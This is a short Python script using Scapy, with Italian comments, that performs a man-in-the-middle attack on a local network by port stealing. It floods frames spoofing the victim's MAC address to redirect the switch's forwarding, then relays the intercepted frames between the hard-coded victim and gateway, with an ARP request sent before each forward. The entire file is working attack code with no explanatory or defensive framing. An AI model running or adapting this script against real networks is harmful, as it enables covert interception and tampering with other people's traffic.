from scapy.all import *
from scapy.layers.inet import Ether, IP, TCP
import time
import threading

gateway_mac='52:54:00:88:15:b6'
victim_mac='08:00:27:24:32:1f'
my_mac='70:4d:7b:3b:ca:f2'
broadcast_mac='ff:ff:ff:ff:ff:ff'
my_ip='192.168.20.184'
gateway_ip='192.168.20.1'
victim_ip='192.168.20.101'

flag=0
old_pckt = []
def sniffed(pckt):
	global old_pckt
	global t
	if ARP in pckt:
		#print("ARP droppato")	
		return
	elif IP in pckt and pckt[IP].chksum in old_pckt:
	#	#print("uguale")
		return
	#elif TCP in pckt and pckt[TCP].chksum in old_pckt:
		#print("uguale TCP")
	#	return
	if (pckt[Ether].dst==my_mac and pckt[Ether].src==victim_mac):
		pckt[Ether].dst = gateway_mac	
		sendp(pckt,verbose=0)
		#print("inviata replica a gateway")
	elif (pckt[Ether].dst==victim_mac and pckt[Ether].src==gateway_mac):
		t.do_run=False
		t.join()	
		chi_e_h()
		sendp(pckt,verbose=0)
		t = threading.Thread(target=sono_h)
		t.start()	
		print("inviata replica a vittima")
	if len(old_pckt)>=20:
		old_pckt*=0
	if IP in pckt:
		old_pckt.append(pckt[IP].chksum)
	if TCP in pckt:
		old_pckt.append(pckt[TCP].chksum)

def sono_h():
	#print("entro")
	t = threading.currentThread()
	while getattr(t, "do_run", True):
		#print("arpizzo h")
		sendp(Ether(dst=broadcast_mac,src=victim_mac)/IP(src=str(RandIP()),dst=str(RandIP()))/TCP(sport=2321,dport=23423,flags='R',options=[('Timestamp',(0,0))]),verbose=0 )
		time.sleep(0.3)
	#print("stopped")

def chi_e_h():
	#print("chi e' h")
	sendp(Ether(dst=broadcast_mac,src=my_mac)/ARP(op=1,psrc=my_ip,pdst=victim_ip),verbose=0)




t = threading.Thread(target=sono_h)
t.start()
sniff(lfilter=lambda d: (d.dst==my_mac and d.src==victim_mac) or (d.dst==victim_mac and d.src==gateway_mac), prn=sniffed)

